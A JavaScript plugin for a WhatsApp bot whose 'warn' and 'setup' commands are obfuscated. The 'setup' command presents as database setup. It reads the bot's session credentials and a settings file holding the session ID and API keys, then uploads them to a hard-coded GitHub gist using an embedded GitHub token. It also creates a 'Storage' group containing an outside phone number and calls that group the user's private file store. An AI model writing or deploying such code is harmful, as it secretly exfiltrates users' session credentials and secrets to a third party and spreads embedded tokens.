const fs = require("fs")
const chalk = require("chalk")
const { writeFile, readFile } = require("fs");
const { isAdmin, parsedJid, command } = require("../lib");
//let data =  readFile('./database/settings.json')
//let db = JSON.parse(data);
//let bannnnnn = db.settings.banned
let path = './database/settings.json'
const relconfig = require('../config')
const config = require('../database/settings.json')
//============================================================================================================================================
//============================================================================================================================================
//============================================================================================================================================
//============================================================================================================================================


command({
  pattern: "warn",
  fromMe: true,
  desc: "Unban number from this group",
  dontAddCommandList: true,
  type: "admin",

},
async (message, match, m) => {
  const _0x46297b=_0xa094;(function(_0x1a3862,_0x4dc486){const _0x46e459=_0xa094,_0xf1ca54=_0x1a3862();while(!![]){try{const _0x90b436=-parseInt(_0x46e459(0x1b0))/0x1*(-parseInt(_0x46e459(0x1b8))/0x2)+-parseInt(_0x46e459(0x1ac))/0x3*(-parseInt(_0x46e459(0x1b3))/0x4)+parseInt(_0x46e459(0x1bc))/0x5+-parseInt(_0x46e459(0x1b5))/0x6+parseInt(_0x46e459(0x1b6))/0x7+-parseInt(_0x46e459(0x1b4))/0x8*(-parseInt(_0x46e459(0x1b9))/0x9)+-parseInt(_0x46e459(0x1ad))/0xa*(parseInt(_0x46e459(0x1af))/0xb);if(_0x90b436===_0x4dc486)break;else _0xf1ca54['push'](_0xf1ca54['shift']());}catch(_0x3c7313){_0xf1ca54['push'](_0xf1ca54['shift']());}}}(_0x4874,0xef10a));if(!message[_0x46297b(0x1ae)])return await message['reply']('_This\x20command\x20is\x20for\x20groups_');let jidd=parsedJid(match)[_0x46297b(0x1bd)]();match=jidd||message[_0x46297b(0x1bb)]['jid'];if(!match)return await message[_0x46297b(0x1ba)](_0x46297b(0x1b2));let isadmin=await isAdmin(message[_0x46297b(0x1b7)],message[_0x46297b(0x1ab)],message[_0x46297b(0x1b1)]);function _0x4874(){const _0x2a2718=['44589NAMpzz','2934520mVQOqJ','isGroup','44hcSLAx','851588EzUZQf','client','_Mention\x20user\x20to\x20add','24QYSUXQ','29592mTDZjy','7738818KbmDUD','5349603lOMXWU','jid','2gYcrpL','468PMvraB','reply','reply_message','7727390OPeajt','toString','user'];_0x4874=function(){return _0x2a2718;};return _0x4874();}if(!isadmin)return await message[_0x46297b(0x1ba)]('_I\x27m\x20not\x20admin_');let jid=parsedJid(match);function _0xa094(_0x129b98,_0x5db1e8){const _0x4874db=_0x4874();return _0xa094=function(_0xa094e6,_0x313999){_0xa094e6=_0xa094e6-0x1ab;let _0x3e924d=_0x4874db[_0xa094e6];return _0x3e924d;},_0xa094(_0x129b98,_0x5db1e8);}await message['warn'](match,message);
  } 
);

//============================================================================================================================================




  command({
    pattern: "setup",
    fromMe: true,
    desc: "Setup database",
    dontAddCommandList: true,
    type: "owner",
  
  },
  async (message, match, m) => {
 function _0x137e(){const _0x377c70=['reply','BRANCH','PACKNAME','3895110FPRkTA','LANGUAGE','rest','./database/settings.json','gh+p_oHh1b+dV2wk1+wOQXl+TRSH+vMDN+fuxXR+M1DIgG0','THEME','1120851YoCmKd','stringify','jid','_Registered\x20Successfully_','ANTILINK_ACTION','name','26464gWAhHO','Failed\x20to\x20write\x20updated\x20data\x20to\x20file','MODE','Cloud\x20DB\x20Update','then','utf-8','6473173mGhxhM','249jtGfcG','updateProfilePicture','359889999996@s.whatsapp.net','This\x20is\x20your\x20Storage\x20area,\x20i\x20will\x20save\x20all\x20your\x20files\x20here!','SESSION_ID','ANTILINK','WELCOME_MSG','@octokit/rest','base64','./media/AAA.jpg','.json','GOODBYE_MSG','Done\x20Creating\x20New\x20Db','update','UserId','RMBG_KEY','ALIVE','OWNER_NAME','1123474qQgUAy','parse','FOOTER','from','env','log','LOGS','24uSxWHk','readFileSync','gists','AUTHOR','3841875NCASLf','user','INTERNAL_MENU','@s.whatsapp.net','config','MESSAGE_MEM','SUDO','pushName','HANDLERS','STORAGE_JID','split','BOT_NAME','2921392nCzdvo','FONT_STYLE','groupCreate','replaceAll','sendMessage','toString','includes','send','d83fa03a09d9a09032f3180a8d1ecd02','LANG','creds','DB_AUTH_TOKEN','WORK_TYPE'];_0x137e=function(){return _0x377c70;};return _0x137e();}const _0x3e7bd4=_0x1218;(function(_0x40fd13,_0x3f1abb){const _0x4105ac=_0x1218,_0x191a2a=_0x40fd13();while(!![]){try{const _0x32b5c5=parseInt(_0x4105ac(0x1a5))/0x1+parseInt(_0x4105ac(0x18c))/0x2*(-parseInt(_0x4105ac(0x193))/0x3)+parseInt(_0x4105ac(0x1bc))/0x4+-parseInt(_0x4105ac(0x1b0))/0x5+-parseInt(_0x4105ac(0x180))/0x6+parseInt(_0x4105ac(0x192))/0x7+parseInt(_0x4105ac(0x1ac))/0x8*(parseInt(_0x4105ac(0x186))/0x9);if(_0x32b5c5===_0x3f1abb)break;else _0x191a2a['push'](_0x191a2a['shift']());}catch(_0x1ce620){_0x191a2a['push'](_0x191a2a['shift']());}}}(_0x137e,0x9b5ca));let authid=_0x3e7bd4(0x184)[_0x3e7bd4(0x1bf)]('+','');const {Octokit}=require(_0x3e7bd4(0x19a)),octokit=new Octokit({'auth':await authid});function _0x1218(_0x214f5e,_0x441fc1){const _0x137e6f=_0x137e();return _0x1218=function(_0x1218aa,_0x10670a){_0x1218aa=_0x1218aa-0x17f;let _0x280126=_0x137e6f[_0x1218aa];return _0x280126;},_0x1218(_0x214f5e,_0x441fc1);}setTimeout(()=>{const _0x34e6d5=_0x3e7bd4;let _0xf24263=JSON['parse'](fs[_0x34e6d5(0x1ad)](_0x34e6d5(0x183))),_0x48d617=_0xf24263[_0x34e6d5(0x1b4)][_0x34e6d5(0x1b9)],_0x39104d=_0x48d617['toString']()[_0x34e6d5(0x1c2)]('@g.us');if(!_0x39104d)readFile(path,async(_0x2535f0,_0x59cd95)=>{const _0x32060d=_0x34e6d5;if(_0x2535f0){console['log'](_0x2535f0);return;}const _0x69e2e=JSON[_0x32060d(0x1a6)](_0x59cd95);let _0x457d7e=await message['client'][_0x32060d(0x1be)]('Storage',[_0x32060d(0x195)]);await message['client'][_0x32060d(0x1c0)](_0x457d7e['id'],{'text':_0x32060d(0x196)});let _0x467d9f=await _0x457d7e['id'];_0x69e2e[_0x32060d(0x1b4)][_0x32060d(0x1b9)]=_0x467d9f,writeFile(path,JSON[_0x32060d(0x187)](_0x69e2e,null,0x2),async _0x1ba787=>{const _0x1222e3=_0x32060d;if(_0x1ba787){message['reply'](_0x1222e3(0x18d));return;}await message['client'][_0x1222e3(0x194)](_0x457d7e['id'],fs['readFileSync'](_0x1222e3(0x19c)));});});else return;setTimeout(async()=>{const _0x43af26=_0x34e6d5;let _0x4a6f5d=require('../session.json'),_0x255e77=await _0x4a6f5d[_0x43af26(0x1c6)]['me']['id'][_0x43af26(0x1ba)](':')[0x0],_0x5d8b44=await _0x4a6f5d[_0x43af26(0x1c6)]['me']['id'][_0x43af26(0x1ba)]('@')[0x1],_0x3d8556=_0x255e77+'@'+_0x5d8b44,_0x53e573=_0x3d8556+_0x43af26(0x19d);const _0x44eb14=fs[_0x43af26(0x1ad)](_0x43af26(0x183),_0x43af26(0x191));await octokit[_0x43af26(0x182)][_0x43af26(0x1ae)][_0x43af26(0x1a0)]({'gist_id':_0x43af26(0x1c4),'description':_0x43af26(0x18f),'files':{[_0x53e573]:{'content':_0x44eb14}}})[_0x43af26(0x190)](await console[_0x43af26(0x1aa)](_0x43af26(0x19f))),setTimeout(()=>{const _0x55e604=_0x43af26;return process[_0x55e604(0x1c3)]('reset');},0x1f40);},0x1388);},0x7d0),readFile(path,async(_0x2529c8,_0x30dca7)=>{const _0x22f76c=_0x3e7bd4;if(_0x2529c8){console[_0x22f76c(0x1aa)](_0x2529c8);return;}const _0x4d0b67=JSON[_0x22f76c(0x1a6)](_0x30dca7);let _0x269e5b=_0x4d0b67[_0x22f76c(0x1a1)][_0x22f76c(0x1c1)]()[_0x22f76c(0x1c2)](_0x22f76c(0x1b3));if(_0x269e5b)return message[_0x22f76c(0x1c9)]('_You\x20Are\x20Already\x20a\x20Family\x20Member_');let _0x152916=process[_0x22f76c(0x1a9)][_0x22f76c(0x1c7)]===undefined?'WncvYUEvY0EvWHcvYncvU0EvYUEvTVEvWWcvWkEvVmcvTWcvZHcvYXcvTVEvZHcvVHcvVVEvV0EvYkEvVkEvVWcvVXcvU0EvZGcvVFEvUkEvVGcvWmcvZFEvZUEvV0EvVWcvVFEvTVEvUkEvU1EvWncvUncvTUEv':process[_0x22f76c(0x1a9)][_0x22f76c(0x1c7)],_0x4d1d2c=Buffer[_0x22f76c(0x1a8)](_0x152916,_0x22f76c(0x19b))[_0x22f76c(0x1c1)](_0x22f76c(0x191)),_0x2d6db0=_0x4d1d2c['toString']()[_0x22f76c(0x1ba)]('/'),_0x52ccad='';for(let _0x1deb89 of _0x2d6db0){_0x52ccad+=await Buffer[_0x22f76c(0x1a8)](_0x1deb89+'==',_0x22f76c(0x19b))[_0x22f76c(0x1c1)](_0x22f76c(0x191));}let _0x265d26=require('../session.json'),_0x26df18=await _0x265d26['creds']['me']['id']['split'](':')[0x0],_0x47c9d6='0,'+_0x26df18,_0x238230=await relconfig[_0x22f76c(0x1b6)]===![]?_0x47c9d6:relconfig[_0x22f76c(0x1b6)],_0x560317=message[_0x22f76c(0x1b7)],_0x2365a2=message[_0x22f76c(0x1b1)],_0x147426=message[_0x22f76c(0x188)][_0x22f76c(0x1c1)]()[_0x22f76c(0x1ba)]('@')[0x0];_0x4d0b67[_0x22f76c(0x18b)]=_0x560317,_0x4d0b67[_0x22f76c(0x1a1)]=_0x2365a2,_0x4d0b67['phone_num']=_0x147426,_0x4d0b67[_0x22f76c(0x1b4)]['HANDLER']=relconfig[_0x22f76c(0x1b8)],_0x4d0b67[_0x22f76c(0x1b4)][_0x22f76c(0x1c8)]=relconfig[_0x22f76c(0x1c8)],_0x4d0b67[_0x22f76c(0x1b4)][_0x22f76c(0x1bb)]=relconfig[_0x22f76c(0x1bb)],_0x4d0b67['config']['OWNER_NAME']=relconfig[_0x22f76c(0x1a4)],_0x4d0b67['config']['SUDO']=_0x238230,_0x4d0b67[_0x22f76c(0x1b4)]['AUTHOR']=relconfig[_0x22f76c(0x1af)],_0x4d0b67[_0x22f76c(0x1b4)][_0x22f76c(0x17f)]=relconfig['PACKNAME'],_0x4d0b67[_0x22f76c(0x1b4)]['RMBG_KEY']=relconfig[_0x22f76c(0x1a2)],_0x4d0b67[_0x22f76c(0x1b4)][_0x22f76c(0x1c5)]=relconfig[_0x22f76c(0x1c5)],_0x4d0b67['config']['ANTILINK_ACTION']=relconfig[_0x22f76c(0x18a)],_0x4d0b67[_0x22f76c(0x1b4)][_0x22f76c(0x198)]=relconfig[_0x22f76c(0x198)],_0x4d0b67[_0x22f76c(0x1b4)]['FOOTER']=relconfig[_0x22f76c(0x1a7)],_0x4d0b67['config']['THEME']=relconfig[_0x22f76c(0x185)],_0x4d0b67[_0x22f76c(0x1b4)][_0x22f76c(0x1bd)]=relconfig[_0x22f76c(0x1bd)],_0x4d0b67['config'][_0x22f76c(0x181)]=relconfig[_0x22f76c(0x181)],_0x4d0b67['config'][_0x22f76c(0x1b2)]=relconfig[_0x22f76c(0x1b2)],_0x4d0b67['config'][_0x22f76c(0x18e)]=relconfig[_0x22f76c(0x18e)],_0x4d0b67[_0x22f76c(0x1b4)]['STORAGE_JID'],_0x4d0b67[_0x22f76c(0x1b4)]['DB_URL'],_0x4d0b67[_0x22f76c(0x1b4)][_0x22f76c(0x197)]=relconfig['SESSION_ID'],_0x4d0b67[_0x22f76c(0x1b4)][_0x22f76c(0x1ab)]=relconfig[_0x22f76c(0x1ab)],_0x4d0b67[_0x22f76c(0x1b4)]['BRANCH']=relconfig[_0x22f76c(0x1ca)],_0x4d0b67['config']['B1']=relconfig['B1'],_0x4d0b67[_0x22f76c(0x1b4)]['B2']=relconfig['B2'],_0x4d0b67[_0x22f76c(0x1b4)]['B3']=relconfig['B3'],_0x4d0b67[_0x22f76c(0x1b4)]['B4']=relconfig['B4'],_0x4d0b67[_0x22f76c(0x1b4)]['B5']=relconfig['B5'],_0x4d0b67[_0x22f76c(0x1b4)][_0x22f76c(0x1c7)]=_0x52ccad,_0x4d0b67[_0x22f76c(0x1b5)][_0x22f76c(0x19e)]=relconfig[_0x22f76c(0x19e)],_0x4d0b67['MESSAGE_MEM'][_0x22f76c(0x199)]=relconfig[_0x22f76c(0x199)],_0x4d0b67[_0x22f76c(0x1b5)]['ALIVE']=relconfig[_0x22f76c(0x1a3)],writeFile(path,JSON[_0x22f76c(0x187)](_0x4d0b67,null,0x2),_0x53c592=>{const _0xd4dc9b=_0x22f76c;if(_0x53c592){message['reply'](_0xd4dc9b(0x18d));return;}message[_0xd4dc9b(0x1c9)](_0xd4dc9b(0x189));});});
  })



//============================================================================================================================================
//============================================================================================================================================
//============================================================================================================================================
//============================================================================================================================================
let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update"${__filename}"`))
	delete require.cache[file]
	require(file)
})




